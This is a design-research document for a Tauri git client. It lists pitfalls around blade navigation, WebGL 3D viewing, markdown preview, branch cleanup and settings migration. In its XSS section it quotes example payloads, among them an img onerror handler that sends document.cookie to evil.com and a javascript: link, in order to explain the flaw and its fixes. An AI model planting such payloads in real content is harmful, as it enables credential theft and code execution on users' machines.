# Blade Expansion Pitfalls

> **Research Dimension**: Pitfalls for blade-centric navigation, 3D viewer, markdown preview, branch management, and settings migration
> **Project**: FlowForge v1.3+ (Tauri v2 + React 19 + Zustand 5)
> **Existing Codebase**: ~16K LOC frontend, blade stack-based navigation, framer-motion animations
> **Target Constraints**: <200MB memory, <50MB binary size
> **Researched**: 2026-02-07
> **Overall Confidence**: HIGH (grounded in codebase analysis + verified external sources)

---

## Executive Summary

This document catalogs 23 pitfalls specific to adding blade expansion features to FlowForge's existing architecture. Unlike the foundational PITFALLS.md (which covers Tauri/Rust/git2 concerns), this focuses on **integration risks** when layering new features onto the current blade navigation system, Zustand stores, and framer-motion animation patterns.

The most dangerous pitfalls are: (1) WebGL context loss in Tauri WebViews for the 3D viewer, (2) XSS via unsanitized markdown from repository content, and (3) blade stack state corruption when migrating dialogs to blades. Each of these can cause data loss, security vulnerabilities, or architectural rewrites if not addressed in the correct phase.

---

## Critical Pitfalls

### P1: Blade Stack State Corruption During Dialog-to-Blade Migration

**What goes wrong:** FlowForge currently uses modal dialogs (via the custom `Dialog` component in `src/components/ui/dialog.tsx`) for settings, branch creation, merging, worktree operations, and stash management. The blade system (`useBladeStore`) uses a stack with push/pop semantics where only the rightmost blade is "active" and all others collapse to 40px `BladeStrip` components. When migrating dialogs to blades, the blade stack becomes deeply nested (root > file tree > diff > settings), and `popBlade()` or `popToIndex()` can inadvertently destroy intermediate blade state that the user expected to persist.

**Why it happens in FlowForge specifically:** The current `bladeStack` stores blade state as `props: Record<string, unknown>` (line 17 of `blades.ts`). When a blade is popped and later re-pushed, it gets a new `crypto.randomUUID()` id and the component remounts from scratch, losing scroll position, form state, selected items, and any ephemeral UI state.

**Warning signs:**
- User navigates Settings blade > goes deeper > presses Escape > settings form resets to saved values
- Diff blade loses scroll position when user navigates to a sub-blade and back
- File tree selection lost when popping/pushing blades

**Consequences:**
- Users lose unsaved work (settings changes, in-progress forms)
- UX regression compared to the current modal approach where the modal overlays without destroying underlying state

**Prevention:**
1. **Never store ephemeral UI state solely in blade `props`.** Blade props should be identifiers (commit OID, file path, settings category) not form values. Use separate Zustand stores or `useRef` for form state that survives blade push/pop cycles.
2. **Implement blade memoization.** Currently `BladeContainer` only renders the active blade; collapsed blades become `BladeStrip`. Consider keeping blade React subtrees mounted but hidden (via `display: none` or `visibility: hidden`) rather than unmounting them. This preserves scroll position and component state.
3. **Add a `bladeWillPop` guard.** Before popping a blade that contains unsaved changes, check a registered callback. The Settings blade should register a guard that prompts "Discard unsaved changes?"

**Detection:** Test by opening a settings blade, changing a value without saving, pushing a deeper blade, then popping back. If the changed value reverts, this pitfall is active.

**Phase:** Must be addressed before any dialog-to-blade migration begins.

**Confidence:** HIGH -- derived from direct analysis of `blades.ts`, `BladeContainer.tsx`, and `RepositoryView.tsx`.

---

### P2: WebGL Context Loss in Tauri WebViews (3D Viewer)

**What goes wrong:** BabylonJS (or any WebGL-based 3D engine) loses its rendering context inside Tauri's WebView. The canvas goes black, all meshes disappear, and the scene cannot recover without a full engine re-initialization.

**Why it happens in Tauri specifically:** Tauri uses platform WebViews (WKWebView on macOS, WebView2 on Windows, WebKitGTK on Linux). Unlike Electron which bundles Chromium, these system WebViews have less predictable WebGL support:
- **Linux (WebKitGTK 2.40+)**: Known bug where WebGL2 support broke WebGL1 compatibility. The [Tauri issue #6559](https://github.com/tauri-apps/tauri/issues/6559) is still open, labeled "status: upstream."
- **Windows (WebView2)**: WebGL rendering causes significant lag in built applications compared to browser. Hardware acceleration may not activate in all configurations.
- **macOS (WKWebView)**: Generally works but context can be lost during window minimize/restore cycles or when system reclaims GPU resources.

BabylonJS has known memory leak patterns: MSAA renderbuffers leak on resize/dispose, event listeners from camera attachment are not fully unregistered on scene disposal, and `AssetContainer.dispose()` leaks gradually with repeated load/dispose cycles.

**Warning signs:**
- Black canvas after window minimize/restore
- Console warning: "WebGL: CONTEXT_LOST_WEBGL"
- Memory grows linearly over time when navigating in/out of 3D viewer blade
- 3D viewer works in `npm run dev` (browser) but fails in built Tauri app

**Consequences:**
- 3D viewer is completely non-functional on some Linux distributions
- Memory budget (200MB) blown by leaked WebGL resources
- Binary size balloons: BabylonJS core with ES6 tree-shaking is ~1.9MB gzipped minimum (down from 3.6MB without tree-shaking), but still significant for a <50MB binary target

**Prevention:**
1. **Add WebGL context loss recovery.** Listen for the `webglcontextlost` event on the canvas and attempt engine re-initialization:
   ```typescript
   canvas.addEventListener('webglcontextlost', (e) => {
     e.preventDefault(); // Allow context restore
   });
   canvas.addEventListener('webglcontextrestored', () => {
     engine.initEngine(); // Re-create engine
   });
   ```
2. **Strict disposal protocol.** On blade unmount: dispose all meshes, materials, textures, then scene, then engine, in that order. Do NOT rely on `scene.dispose()` alone -- it does not clean up all GPU resources.
3. **Lazy-load BabylonJS.** Use dynamic `import()` so the 3D engine only loads when the user opens a 3D-compatible file. This keeps the base bundle small.
4. **Consider a WebGL-less fallback.** For STL/OBJ files, consider a pure SVG/Canvas 2D wireframe preview as a fallback when WebGL is unavailable. This sidesteps the entire context loss problem.
5. **Test on all three platforms' built apps**, not just dev mode browsers.

**Detection:** Build the Tauri app (not dev mode). Open a 3D file. Minimize the window. Restore it. If the canvas is black, this pitfall is active.

**Phase:** Address during 3D viewer implementation. Consider gating the feature behind a feature flag until all platforms are verified.

**Confidence:** HIGH for the problem (verified via Tauri GitHub issues); MEDIUM for BabylonJS-specific mitigations (based on forum posts, not tested in FlowForge).

---

### P3: XSS via Repository Markdown Content

**What goes wrong:** FlowForge renders markdown from repository files (README.md, CHANGELOG.md, commit messages, PR descriptions). An attacker-controlled repository can embed JavaScript in markdown that executes when FlowForge renders it. In a Tauri desktop app, XSS means access to IPC commands, local filesystem, and potentially arbitrary code execution via Tauri's `invoke()`.

**Why this is especially dangerous in Tauri:** FlowForge's `tauri.conf.json` has `"csp": null` (CSP is disabled). The `assetProtocol` scope is `["**"]` (all files). This means there is zero defense-in-depth -- any XSS payload gets full access to all Tauri capabilities.

**Current state:** The codebase has zero uses of `dangerouslySetInnerHTML` (verified via grep). The existing `ChangelogPreview` component renders markdown as plain text inside a `<pre>` tag, which is safe. However, a new markdown preview blade that renders HTML from markdown (using `marked` to parse and injecting the result) would introduce this vulnerability.

**Attack vectors specific to git clients:**
- Repository README.md containing `<img onerror="fetch('http://evil.com/'+document.cookie)">`
- Markdown links with `javascript:` protocol: `[click me](javascript:alert(1))`
- HTML entities that bypass naive denylist filtering (CVE-2025-24981 demonstrated exactly this against a markdown library)
- SVG files with embedded scripts (already handled by ViewerImageBlade via `<img>` tag, but a markdown renderer might inline SVGs)

**Warning signs:**
- Any use of `dangerouslySetInnerHTML` with markdown-derived content
- Using `marked` without a sanitizer (marked does NOT sanitize by default)
- Testing only with your own repos (attacker-controlled repos are the threat model)

**Consequences:**
- Full local code execution via Tauri IPC
- File system access, credential theft, repo tampering
- CVE-level vulnerability in a desktop app

**Prevention:**
1. **Use `react-markdown` instead of `marked` + `dangerouslySetInnerHTML`.** `react-markdown` converts markdown to React elements without an HTML intermediary, eliminating the XSS vector entirely. It is the only approach that is safe by default.
2. **If `marked` must be used, always pipe through DOMPurify** with a strict configuration:
   ```typescript
   import DOMPurify from 'dompurify';
   import { marked } from 'marked';

   const dirty = marked.parse(untrustedMarkdown);
   const clean = DOMPurify.sanitize(dirty, {
     ALLOWED_TAGS: ['p', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6', 'ul', 'ol', 'li',
                     'a', 'strong', 'em', 'code', 'pre', 'blockquote', 'img', 'table',
                     'thead', 'tbody', 'tr', 'th', 'td', 'hr', 'br'],
     ALLOWED_ATTR: ['href', 'src', 'alt', 'title', 'class'],
     ALLOW_DATA_ATTR: false,
     FORBID_TAGS: ['script', 'style', 'iframe', 'object', 'embed', 'form', 'input'],
   });
   ```
3. **Enable CSP in `tauri.conf.json`** as defense-in-depth:
   ```json
   "csp": "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"
   ```
4. **Strip `javascript:` from all `href` attributes** regardless of sanitizer (defense in depth).
5. **Note:** `marked` and `dompurify` are already installed as transitive dependencies of `@monaco-editor/react` via `monaco-editor`. Do NOT rely on these transitive versions for your own code -- add them as direct dependencies with pinned versions, or preferably use `react-markdown`.

**Detection:** Create a test repository with a malicious README.md containing `<img onerror="document.title='pwned'">`. Open it in the markdown preview blade. If the document title changes, the vulnerability is present.

**Phase:** Must be addressed before any markdown rendering feature ships. Consider enabling CSP now as a baseline hardening step.

**Confidence:** HIGH -- verified CSP is null in `tauri.conf.json`, confirmed zero `dangerouslySetInnerHTML` usage, confirmed `marked` is only a transitive dependency.

---

## High Priority Pitfalls

### P4: File Browser Performance on Large Repositories

**What goes wrong:** The existing `FileTreeView` (in `src/components/staging/FileTreeView.tsx`) and `FileTreeBlade` (`src/components/blades/FileTreeBlade.tsx`) build a full in-memory tree from a flat file list using `useMemo`. For a repository like Linux kernel (~74K files) or a monorepo with deep nesting, this creates tens of thousands of DOM nodes, causing:
- Initial render >1 second
- Scroll jank (>16ms frame times)
- Memory spike from retained React fiber tree

**Why it happens in FlowForge specifically:** The current `FileTreeView` renders ALL tree nodes eagerly (expanded by default, line 150: `useState(true)`). The `FileTreeBlade` similarly renders all nodes without virtualization. Neither component uses `react-virtuoso` (which IS already installed) or any windowing technique.

**Warning signs:**
- File tree takes >200ms to render on a repo with 1000+ changed files
- Scroll stutter in the staging panel
- Browser DevTools shows thousands of DOM nodes in the tree

**Prevention:**
1. **Virtualize the file tree.** Use `react-virtuoso` (already a dependency) or `react-arborist` for windowed rendering. Only render visible tree nodes (~50-100 nodes in viewport) instead of all nodes.
2. **Collapse directories by default** for repos with >200 files. The current default-open behavior (line 150 of FileTreeView.tsx) should be inverted for large file sets.
3. **Debounce the filter input.** The current `FileTreeSearch` filter triggers `useMemo` recalculation on every keystroke. Add a 150ms debounce.
4. **Implement binary file detection early.** When browsing repository files (not just staging changes), detect binary files by checking the first few bytes (or using git's `diff.isBinary` attribute) to avoid loading multi-megabyte binary content into the diff viewer.
5. **Paginate at the Rust/backend level.** When listing all files in a repository tree (not just changed files), use `TreeWalk` with a limit and return results in chunks.

**Detection:** Open a repository with >500 changed files. If the staging panel takes >500ms to render or scrolling is choppy, this pitfall is active.

**Phase:** Address when building the file browser blade. The staging panel's existing tree is already affected but manageable at current scale.

**Confidence:** HIGH -- verified by reading the actual `FileTreeView.tsx` implementation.

---

### P5: Keyboard Focus Management Across Blade Transitions

**What goes wrong:** When a blade is pushed (slide-in animation via framer-motion), keyboard focus stays on the element that triggered the push (e.g., a file list item in the parent blade). The new blade's content is not focused, so keyboard-only users cannot interact with the new blade without Tab-cycling through collapsed `BladeStrip` buttons first.

When a blade is popped, focus returns to... nothing. The previously focused element in the parent blade was unmounted and remounted (or was never preserved), so focus falls to `<body>`.

**Why it happens in FlowForge specifically:**
- `BladeContainer.tsx` uses `AnimatePresence` with `mode="popLayout"` and keyed `motion.div` wrappers. When the active blade changes, React unmounts the old active blade and mounts the new one. There is no focus management logic.
- The `useKeyboardShortcuts` hook (lines 187-199) handles Escape to pop blades, and Enter to open commit details, but there is no focus restoration on pop.
- The `BladePanel` component has a back button but no `autoFocus` or `useEffect` to claim focus on mount.

**Warning signs:**
- After pushing a blade, pressing Tab does not move focus to expected elements
- After popping a blade with Escape, focus is "lost" (next Tab goes to browser chrome)
- Screen readers announce nothing when blade transitions occur

**Consequences:**
- Keyboard-only users cannot navigate the app effectively
- Fails WCAG 2.1 Level AA (2.4.3 Focus Order, 2.4.7 Focus Visible)
- Accessibility regression when migrating from dialogs (which DO manage focus via the Dialog component's auto-focus logic on lines 89-96 of `dialog.tsx`)

**Prevention:**
1. **Auto-focus the new blade's first focusable element** on mount. Add a `useEffect` to `BladePanel` that focuses either the back button or the first interactive element within the blade content.
2. **Restore focus on pop.** Maintain a focus stack parallel to the blade stack. When a blade is pushed, record `document.activeElement`. When popped, restore focus to the recorded element (if still in DOM) or the blade strip button.
3. **Announce blade transitions to screen readers.** Use `aria-live="polite"` on a visually-hidden region that announces "Opened [blade title]" / "Returned to [blade title]."
4. **Focus-trap the active blade.** Since collapsed blades become narrow `BladeStrip` buttons, Tab should cycle within the active blade + the strip buttons. Use `focus-trap-react` or implement manually.

**Detection:** Open the app. Use only the keyboard to navigate: Tab to a file, Enter to open diff blade, Escape to go back. If focus is ever "lost" or requires more than 2 Tabs to reach expected content, this pitfall is active.

**Phase:** Address during the blade system enhancement phase, before migrating any dialogs to blades.

**Confidence:** HIGH -- verified by reading `BladeContainer.tsx`, `BladePanel.tsx`, `dialog.tsx`, and `useKeyboardShortcuts.ts`.

---

### P6: Branch Cleanup - Deleting the Wrong Branch

**What goes wrong:** A "clean up merged branches" feature bulk-deletes branches that Git reports as merged. But "merged" is ambiguous:
- A branch merged into `develop` but not `main` shows as "merged" when `develop` is checked out
- Squash-merged branches are NOT detected as merged by `git branch --merged` because their commits have different SHAs
- Rebase-merged branches similarly appear unmerged
- A branch used as a worktree base should never be deleted

**Why it happens in FlowForge specifically:** The current `deleteBranch` in `branches.ts` (line 87-96) calls `commands.deleteBranch(name, force)` with a simple force/non-force toggle. The `BranchList` component (line 35-45) only checks `isMerged` which comes from the Rust backend's `git branch --merged` equivalent. There is no check for:
- Whether the branch tracks a remote and the remote still exists
- Whether the branch is a worktree base
- Whether the merge was done via squash/rebase

**Warning signs:**
- User deletes a branch they thought was merged, loses commits
- Branch cleanup deletes branches used by worktrees, breaking the worktree
- Squash-merged feature branches accumulate because they appear "unmerged"

**Consequences:**
- Permanent data loss (commits unreachable except via reflog, which expires)
- Broken worktrees requiring manual `git worktree prune`
- Loss of user trust in the branch management feature

**Prevention:**
1. **Cross-reference worktrees before any branch deletion.** Query `git worktree list` and block deletion of any branch that is a worktree HEAD.
2. **Show explicit pre-deletion summary.** Before bulk delete, show: branch name, last commit date, whether it has a remote tracking branch, whether the remote is ahead, number of unique commits.
3. **Detect squash/rebase merges.** Compare the branch tip's tree with the target branch's tree. If the trees are identical (or the diff is empty), the branch content was merged even if the commit SHA differs.
4. **Never auto-delete.** Always require explicit user confirmation. Provide a "select all" checkbox but default to unchecked.
5. **Protect `main`/`master`/`develop` unconditionally.** Hardcode these as undeletable in the UI regardless of merge status.
6. **Add undo via reflog.** After deletion, show a toast with "Undo" that runs `git branch <name> <reflog-sha>` to restore the branch.

**Detection:** Create a feature branch, squash-merge it to main, then check if the branch management UI shows it as "merged" or "unmerged." If it shows as "unmerged," squash-merge detection is missing.

**Phase:** Address during branch management blade implementation.

**Confidence:** HIGH -- verified from `branches.ts` and `BranchList.tsx` source code.

---

## Medium Priority Pitfalls

### P7: Settings Blade - Unsaved Changes Lost on Navigation

**What goes wrong:** The current `SettingsWindow` (in `src/components/settings/SettingsWindow.tsx`) is a modal dialog that persists-on-save via `updateSetting()` in `useSettingsStore`. Each individual setting change calls `store.set()` and `store.save()` immediately (lines 73-93 of `settings.ts`). If settings migrate to a blade, and the blade uses a "Save" button pattern instead of auto-save, users will lose changes when:
- They press Escape (which pops the blade via `useKeyboardShortcuts`, line 187-199)
- They click a `BladeStrip` to navigate to a different blade
- They switch the process (staging/topology) which calls `setProcess()` and resets the entire blade stack (line 42-46 of `blades.ts`)

**Why it happens in FlowForge specifically:** The blade store's `setProcess()` calls `resetStack()` which replaces the entire blade stack with a single root blade. If a settings blade is anywhere in the stack, it is destroyed instantly with no opportunity to save.

**Prevention:**
1. **Keep auto-save for settings.** The current immediate-save pattern is actually better UX for settings. Migrating to a blade should NOT change the save semantics -- each setting change should still persist immediately.
2. **If batch-save is needed**, register a `beforePopGuard` on the blade that checks for unsaved changes and shows a confirmation dialog.
3. **Store dirty state outside the blade.** Use a dedicated `useSettingsDraftStore` that persists draft values independently of the blade lifecycle. The blade merely displays and edits this draft store.
4. **Never use `setProcess()` to navigate away from a settings blade.** Settings should be accessible from any process without resetting the stack. Consider making settings a global overlay (like it is now) rather than a blade, or implement it as a blade that intercepts `setProcess()`.

**Detection:** Open settings blade, change a value, switch from staging to topology process. If the change is lost, this pitfall is active.

**Phase:** Address when migrating settings to a blade (if this migration happens).

**Confidence:** HIGH -- derived from direct analysis of `settings.ts` and `blades.ts`.

---

### P8: 3D Viewer Memory Leak on Repeated Blade Push/Pop

**What goes wrong:** User opens a 3D model file (pushing a viewer blade), navigates away (popping), opens another (pushing again), repeats. Each cycle allocates GPU resources (buffers, textures, shaders) that are not fully released on pop because:
- BabylonJS `scene.dispose()` does not release MSAA renderbuffers (documented bug)
- `engine.dispose()` does not unregister all event listeners (documented in BabylonJS GitHub issue #12084)
- React's `useEffect` cleanup may fire after the canvas is already detached from DOM, causing disposal calls to silently fail

**Why it happens in FlowForge specifically:** The blade system completely unmounts blade components on pop (`BladeContainer` only renders the active blade). This means the React component's cleanup function runs, but the WebGL context may already be in a partially destroyed state because the canvas DOM node was removed by React before `engine.dispose()` could complete its GPU cleanup.

**Warning signs:**
- Memory usage grows by 10-50MB each time a 3D file is opened and closed
- Console warnings about WebGL resource limits
- Performance degrades after opening 5-10 3D files in sequence

**Prevention:**
1. **Dispose in correct order before unmount.** Use `useLayoutEffect` (not `useEffect`) for disposal so cleanup runs before the DOM is mutated:
   ```typescript
   useLayoutEffect(() => {
     return () => {
       if (sceneRef.current) sceneRef.current.dispose();
       if (engineRef.current) engineRef.current.dispose();
     };
   }, []);
   ```
2. **Track and manually release GPU resources.** Maintain a Set of all created textures, materials, and geometries. In cleanup, iterate and dispose each individually before disposing the scene.
3. **Implement a resource ceiling.** If memory exceeds a threshold (e.g., 150MB), refuse to open additional 3D viewers and prompt the user to close existing ones.
4. **Reuse a single engine instance.** Instead of creating a new BabylonJS engine per blade, maintain a global engine singleton and only swap scenes. This avoids the expensive engine create/destroy cycle.

**Detection:** Open a 3D file, close it, repeat 20 times. Monitor memory in Activity Monitor / Task Manager. If memory grows monotonically, leaks are present.

**Phase:** Address during 3D viewer implementation.

**Confidence:** MEDIUM -- BabylonJS disposal issues are well-documented in forums, but the specific interaction with FlowForge's blade unmount pattern is hypothetical until tested.

---

### P9: Two-Column Layout Collapse at Narrow Window Widths

**What goes wrong:** FlowForge uses `react-resizable-panels` with the sidebar at 20% (min 15%) and blade area at 80%. The blade area itself contains collapsed `BladeStrip` components (40px each) plus the active blade. With 3-4 blades in the stack, the strips consume 120-160px, leaving very little space for the active blade content. At narrow window widths (800px or less, which is reasonable on a laptop with split-screen):
- Sidebar: 120px minimum (15%)
- Blade strips: 120px (3 collapsed blades)
- Resize handle: 4px
- Active blade: 556px remaining -- but Monaco editor, file trees, and 3D viewers need more

**Why it happens in FlowForge specifically:** The `ResizablePanelLayout` wraps `react-resizable-panels` with percentage-based sizing (lines 40-44 of `ResizablePanelLayout.tsx`). The blade strips inside `BladeContainer` are fixed-width (`w-10` = 40px) regardless of available space. There is no logic to auto-collapse the sidebar when blade stack depth increases, or to limit blade stack depth based on available width.

**Warning signs:**
- Active blade content truncates or overflows at small window sizes
- Monaco diff editor becomes too narrow to show meaningful diffs
- 3D viewer canvas is squeezed to unusable dimensions
- Users cannot see file names in file trees

**Prevention:**
1. **Set a minimum width for the active blade.** If the available space falls below 400px, auto-collapse the sidebar or auto-pop blades until the minimum is met.
2. **Limit visible blade strips.** Beyond 3-4 collapsed blades, group older strips into a single "..." strip with a dropdown.
3. **Responsive blade strip width.** At narrow widths, reduce strip width from 40px to 32px or even icon-only (no vertical text).
4. **Add sidebar auto-collapse.** When blade depth is >= 3, auto-collapse the sidebar to a rail (icons only, ~48px). Re-expand when blade depth returns to 1.
5. **Test at 800x600.** The `tauri.conf.json` sets default window to 1200x800 but allows resizing. Users will resize smaller.

**Detection:** Resize the window to 900px wide. Push 3 blades. If the active blade content is less than 400px wide, this pitfall is active.

**Phase:** Address when adding new blade types (file browser, markdown preview, settings, 3D viewer) since each increases the maximum blade stack depth.

**Confidence:** HIGH -- calculated from actual component widths in the codebase.

---

### P10: BabylonJS Bundle Size Exceeds Binary Budget

**What goes wrong:** BabylonJS core (even with ES6 tree-shaking) adds approximately 1.9MB gzipped to the JavaScript bundle. The full library without tree-shaking is 3.6MB+. For a Tauri app targeting <50MB binary size, the JavaScript bundle is a significant portion (Vite output + Monaco editor + BabylonJS + React could total 5-10MB uncompressed).

**Why it matters for FlowForge:** Monaco editor (`@monaco-editor/react`) is already a heavy dependency. Adding BabylonJS on top doubles the JavaScript weight. Tauri embeds the frontend bundle in the binary, so every MB of JavaScript directly increases the app binary size.

**Prevention:**
1. **Lazy-load BabylonJS via dynamic import.** Never include it in the main bundle:
   ```typescript
   const Viewer3D = lazy(() => import('./viewers/Viewer3D'));
   ```
2. **Import only needed ES6 modules.** Use `@babylonjs/core/Engines/engine` instead of `@babylonjs/core`. Only import `Scene`, `ArcRotateCamera`, `HemisphericLight`, `MeshBuilder`, and `STLFileLoader` -- nothing else.
3. **Consider lighter alternatives.** For STL/OBJ preview only (not full 3D editing), `three.js` with manual tree-shaking can be significantly smaller. Even lighter: `stl-viewer` or a custom WebGL renderer for simple mesh display.
4. **Measure before committing.** Run `npx vite-bundle-visualizer` before and after adding the 3D library. If the delta exceeds 2MB gzipped, reconsider the approach.
5. **Consider Rust-side rendering.** Render the 3D preview in Rust using `wgpu` or `rend3` and send a rasterized image to the frontend. This adds zero JavaScript bundle size.

**Detection:** After adding BabylonJS to package.json, run `npm run build` and compare the `dist/` output size to the pre-BabylonJS build.

**Phase:** Evaluate during 3D viewer architecture decision. This is a go/no-go gate for BabylonJS specifically.

**Confidence:** HIGH -- bundle size numbers verified from multiple BabylonJS forum discussions.

---

### P11: Markdown Renderer Inconsistency with GitHub Flavored Markdown

**What goes wrong:** Repository README.md files commonly use GitHub Flavored Markdown (GFM) extensions: task lists, tables, strikethrough, autolinks, footnotes, alert blockquotes. A basic markdown renderer will render these incorrectly or not at all, making the preview look broken compared to what users see on GitHub.

**Prevention:**
1. **Use `react-markdown` with `remark-gfm` plugin** for full GFM support.
2. **Support syntax highlighting in fenced code blocks** via `rehype-highlight` or `rehype-prism-plus`.
3. **Render relative links correctly.** Repository markdown often uses relative paths (`./docs/GUIDE.md`). These need to be resolved against the repository root, not the app's origin.
4. **Handle image paths.** Markdown images with relative paths (`![screenshot](./images/demo.png)`) need to be resolved to actual file content via the Tauri asset protocol or by reading the file through a Rust command and converting to a data URL.

**Detection:** Open a repository with a complex README.md (containing tables, task lists, code blocks with syntax highlighting, relative image links). Compare rendering to GitHub. Differences indicate gaps.

**Phase:** Address during markdown preview blade implementation.

**Confidence:** MEDIUM -- specific GFM extension support depends on library choice.

---

### P12: Framer-Motion Animation Conflicts with Blade Stack Changes

**What goes wrong:** The current `BladeContainer` uses `AnimatePresence mode="popLayout"` for blade transitions. When multiple blade operations happen rapidly (e.g., user double-clicks a commit in topology, triggering push > push), framer-motion's exit animations can conflict with entry animations, causing:
- Visual glitches (two blades briefly visible)
- Animation "stuck" in intermediate state
- React key collision warnings

**Why it happens in FlowForge specifically:** The `AnimatePresence` wraps only the active blade with `key={blade.id}` (line 30 of `BladeContainer.tsx`). But the `key="active-blade"` on the `AnimatePresence` itself means React reuses the same AnimatePresence instance for all active blades, which can cause exit animation of old blade to overlap with entry animation of new blade when stack changes rapidly.

**Prevention:**
1. **Debounce rapid blade operations.** Add a 200ms cooldown to `pushBlade` that ignores duplicate pushes.
2. **Use `mode="wait"` instead of `mode="popLayout"`** if overlapping animations cause issues. `wait` ensures the exit completes before entry begins.
3. **Move `AnimatePresence` outside the map loop.** The current structure wraps `AnimatePresence` inside the `bladeStack.map()` which means a new AnimatePresence is created for each active blade. Consider wrapping the entire blade area in a single AnimatePresence.
4. **Disable animations for push-then-immediate-push** sequences. If two pushes happen within 100ms, skip the intermediate animation.

**Detection:** Rapidly click different commits in the topology view. If animations stutter, overlay, or the wrong blade briefly appears, this pitfall is active.

**Phase:** Address during blade system enhancement, before adding new blade types.

**Confidence:** HIGH -- identified from direct analysis of `BladeContainer.tsx` animation structure.

---

### P13: Escape Key Conflicts Between Blades, Dialogs, and Command Palette

**What goes wrong:** The Escape key is overloaded in FlowForge:
- `useKeyboardShortcuts` (line 187-199): Pops blade if stack depth > 1
- `dialog.tsx` (line 76-86): Closes any open dialog
- `CommandPalette`: Has its own Escape handler

Currently, the command palette is checked first (line 193: `if (useCommandPaletteStore.getState().isOpen) return`). But when new blades contain dialogs (e.g., a confirmation dialog inside a settings blade), or when blade content itself uses forms with Escape-to-cancel semantics, the priority becomes ambiguous.

**Warning signs:**
- Pressing Escape closes both a dialog AND pops the blade simultaneously
- Pressing Escape in a text input that should cancel editing instead pops the blade
- Settings blade with a confirmation dialog: Escape closes dialog, second Escape pops blade, but user expected to stay on settings

**Prevention:**
1. **Implement an Escape priority stack.** Register handlers with priority levels: dialogs > blade-local handlers > blade pop > command palette close. Only the highest-priority handler fires.
2. **Use `event.stopPropagation()` in dialog Escape handlers** to prevent the event from bubbling to the blade pop handler.
3. **Add `enableOnFormTags: false` consistently.** The current `useKeyboardShortcuts` Escape handler has this (line 198), but blade-local Escape handlers may not.
4. **Test the full Escape chain.** Open command palette > close. Open settings blade > open a sub-dialog > Escape should close dialog, not blade.

**Detection:** Open a blade with a dialog open inside it. Press Escape. If both the dialog and blade close, the conflict is present.

**Phase:** Address alongside blade system enhancement, particularly before adding settings blade or any blade that contains dialogs.

**Confidence:** HIGH -- identified from `useKeyboardShortcuts.ts` and `dialog.tsx` source code.

---

### P14: Process Switch Destroys Deep Blade State

**What goes wrong:** Switching between "staging" and "topology" processes calls `setProcess()` in `blades.ts` (line 42-46), which replaces the entire blade stack with a new root blade. If a user has navigated deep into a blade stack (root > commit > file > diff) and accidentally switches the process toggle, all navigation state is destroyed.

**Why it happens in FlowForge specifically:** `setProcess()` does `set({ activeProcess: process, bladeStack: [rootBladeForProcess(process)] })`. There is no per-process stack preservation. This is fine when the blade stack is always shallow (1-2 blades), but becomes a serious UX problem as more blade types are added and stacks become deeper.

**Prevention:**
1. **Maintain separate blade stacks per process.** Store `stagingStack: Blade[]` and `topologyStack: Blade[]` independently. `setProcess()` switches which stack is active without destroying the inactive one.
2. **Add navigation confirmation** if the target blade stack would be destroyed and it has depth > 1.
3. **Limit process switches when deep in blade stack.** Show the process toggle as disabled/dimmed when blade depth > 2, with a tooltip "Return to root to switch views."

**Detection:** Navigate 3 blades deep in staging view. Switch to topology. Switch back to staging. If you are back at root instead of your 3-deep position, this pitfall is active.

**Phase:** Address during blade system architecture enhancement, before adding new blade types.

**Confidence:** HIGH -- verified from `blades.ts` line 42-46.

---

### P15: Markdown Preview - Relative Path Resolution Failure

**What goes wrong:** Repository markdown files reference relative paths for images, links to other docs, and anchors. When rendered in a Tauri WebView, these relative paths resolve against the WebView's origin (localhost:1420 in dev, tauri://localhost in production), not the repository root. Images fail to load, links are broken.

**Prevention:**
1. **Intercept all `src` and `href` attributes** in the rendered markdown. Resolve relative paths against the repository working directory.
2. **Use Tauri's asset protocol** (`asset://localhost/`) for local file access, or read file content through a Rust command and convert to base64 data URLs (the pattern already used by `ViewerImageBlade`).
3. **Handle anchor links** (e.g., `#section-header`) by scrolling within the blade rather than navigating to a new URL.
4. **Handle cross-file links** (e.g., `./docs/GUIDE.md`) by pushing a new markdown preview blade for the linked file.

**Detection:** Open a README.md that contains a relative image path. If the image does not render, path resolution is broken.

**Phase:** Address during markdown preview blade implementation.

**Confidence:** HIGH -- this is a universal problem with rendering local markdown in WebViews.

---

## Lower Priority Pitfalls

### P16: Monaco Editor Instance Accumulation Across Blade Stack

**What goes wrong:** Each `DiffBlade` creates a new Monaco `DiffEditor` instance. With the blade system, multiple diff blades can exist in the stack simultaneously (even though only one is visible). Monaco editors are heavy (~30MB memory each) and do not release resources when hidden.

**Current state:** Because `BladeContainer` unmounts non-active blades (rendering `BladeStrip` instead), this is currently NOT a problem -- only one Monaco instance exists at a time. However, if the blade system is modified to keep blades mounted-but-hidden (as suggested in P1 prevention #2), multiple Monaco instances would accumulate.

**Prevention:** If implementing blade memoization (P1), explicitly unmount/dispose Monaco editors when their blade becomes inactive. Use `editor.dispose()` in a visibility change handler rather than relying on React unmount.

**Phase:** Address only if blade memoization (keeping unmounted blades alive) is implemented.

**Confidence:** HIGH -- verified Monaco is used in `DiffBlade.tsx`.

---

### P17: Branch Cleanup Upstream Sync Race Condition

**What goes wrong:** A "clean up branches" operation might delete a local branch that is still being pushed to the remote. Or delete a branch that a team member just pushed new commits to (the local branch is stale but the remote has new work).

**Prevention:**
1. **Fetch before cleanup.** Always run `git fetch --prune` before evaluating which branches to clean up.
2. **Show remote status.** For each branch in the cleanup list, show whether the remote tracking branch still exists and whether the remote is ahead/behind.
3. **Default to local-only deletion.** Only delete local branches; never auto-delete remote branches.

**Phase:** Address during branch management blade.

**Confidence:** MEDIUM -- race condition is theoretical but well-understood in git workflows.

---

### P18: 3D Viewer File Format Ambiguity

**What goes wrong:** The `useBladeNavigation` hook routes files to viewer blades based on file extension (line 6-20 of `useBladeNavigation.ts`). For 3D files, extensions are ambiguous:
- `.obj` could be a Wavefront 3D object or a compiled object file
- `.stl` could be STL 3D mesh or a Standard Template Library file
- `.glb`/`.gltf` are unambiguous but uncommon in git repos
- Binary detection is needed to distinguish text-based 3D formats from other files

**Prevention:**
1. **Use magic bytes, not just extension.** STL binary files start with 80 bytes of header + triangle count. OBJ text files start with comment lines or `v ` vertex definitions.
2. **Offer "Open as..." fallback.** If the 3D viewer fails to parse a file, offer to open it as a text diff instead.
3. **Only register 3D viewer for known extensions** (`.stl`, `.obj`, `.glb`, `.gltf`, `.fbx`) and require the user to explicitly "Open in 3D viewer" for others.

**Phase:** Address during 3D viewer implementation.

**Confidence:** MEDIUM.

---

